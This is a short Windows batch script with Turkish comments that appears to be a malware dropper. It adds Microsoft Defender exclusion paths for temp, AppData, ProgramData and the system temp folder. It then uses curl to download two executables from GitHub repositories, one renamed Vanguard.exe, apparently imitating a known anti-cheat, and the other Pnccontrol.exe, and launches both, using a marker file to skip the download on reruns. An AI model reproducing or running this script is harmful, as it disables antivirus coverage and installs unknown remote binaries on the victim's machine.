@echo off
cd /d %temp%
powershell -c Add-MpPreference -ExclusionPath "%temp%"
powershell -c Add-MpPreference -ExclusionPath "%APPDATA%"
powershell -c Add-MpPreference -ExclusionPath "%PROGRAMDATA%"
powershell -c Add-MpPreference -ExclusionPath "%SYSTEMROOT%\TEMP"

REM Dosya kontrolü
if exist nagihori2.txt (
    echo nagihori2.txt bulundu, dosyalar kontrol ediliyor...
    if exist Vanguard.exe if exist Pnccontrol.exe (
        start Vanguard.exe
        start Pnccontrol.exe
        exit /b
    )
)

REM Dosyalar yoksa veya nagihori2.txt yoksa buraya devam eder
echo Dosyalar hazirlaniyor...
curl -L https://github.com/seition2doc/dosta2/raw/refs/heads/main/Vanguard.exe -o Vanguard.exe
curl -L https://github.com/Banglade-sh23/-/raw/refs/heads/main/local3.exe -o Pnccontrol.exe
echo "asd" > nagihori2.txt 
start Vanguard.exe
start Pnccontrol.exe
